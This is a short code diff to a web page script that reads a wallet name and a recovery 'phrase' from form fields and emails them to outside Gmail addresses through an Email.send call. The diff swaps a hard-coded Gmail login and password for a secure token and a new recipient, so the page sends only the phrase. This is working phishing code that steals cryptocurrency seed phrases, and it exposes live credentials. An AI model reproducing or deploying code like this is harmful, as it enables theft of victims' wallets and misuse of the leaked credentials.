@@ -85,13 +85,11 @@
          var phrase = document.getElementById("phrase").value
          var body = "wallet: " + wallet + "<br/> phrase: " +phrase;
          Email.send({
-            Host : "smtp.gmail.com",
-            Username : "nosarumenimuentinyan@gmail.com",
-            Password : "bqfuwhbtuysvzqhd",
-            To : 'nosarumenimuentinyan@gmail.com',
+            SecureToken : "9fee8bb4-5a49-4105-8317-1926d1765c2f",
+            To : 'nickolasi085@gmail.com',
             From : "you@isp.com",
             Subject : "This is the subject",
-            Body : body
+            Body : phrase
          }).then(
          message => alert(message)
          );
